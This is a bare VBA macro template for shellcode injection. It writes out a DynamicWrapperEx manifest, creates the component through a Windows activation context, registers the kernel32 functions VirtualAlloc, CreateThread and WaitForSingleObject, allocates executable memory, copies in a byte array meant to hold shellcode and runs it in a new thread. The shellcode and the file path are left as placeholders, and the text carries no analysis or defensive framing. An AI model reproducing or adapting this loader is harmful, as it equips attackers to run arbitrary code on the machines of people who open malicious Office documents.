Sub Activation()
    Dim manifest As String
    manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?><assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0""><assemblyIdentity type=""win32"" name=""DynamicWrapperEx"" version=""1.0.0.0""/> <file name=""DynamicWrapperEx.dll""> <comClass description=""DynamicWrapperEx"" clsid=""{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}"" threadingModel=""Both"" progid=""DynamicWrapperEx""/></file></assembly>"
 
    ' Change TMP Environment variable
    Dim env As Object
    Set env = CreateObject("WScript.Shell")
    env.Environment("Process").Item("TMP") = "<path here>"

    ' Create ActivationContext
    Dim dwx As Object
    Set dwx = CreateObject("Microsoft.Windows.ActCtx")
    dwx.ManifestText = manifest
    
    ' Create Automation server
    Dim server As Object
    Set server = dwx.CreateObject("DynamicWrapperEx")
    
    ' Execute code ....
    server.DwRegister "kernel32.dll", "VirtualAlloc"
    server.DwRegister "kernel32.dll", "CreateThread"
    server.DwRegister "kernel32.dll", "WaitForSingleObject"
    
    Dim shellcode As Variant
    shellcode = Array(0, 0, 0)
        
    Dim lpAddress As LongLong
    lpAddress = server.VirtualAlloc(0, UBound(shellcode), &H1000, &H40)
    
    For cx = LBound(shellcode) To UBound(shellcode)
        i = server.WriteByte(CByte(shellcode(cx)), CLngLng(lpAddress), CLng(cx))
    Next cx
    
    hThread = server.CreateThread(0, 0, CLngLng(lpAddress), 0, 0, 0)
    server.WaitForSingleObject hThread, -1
End Sub
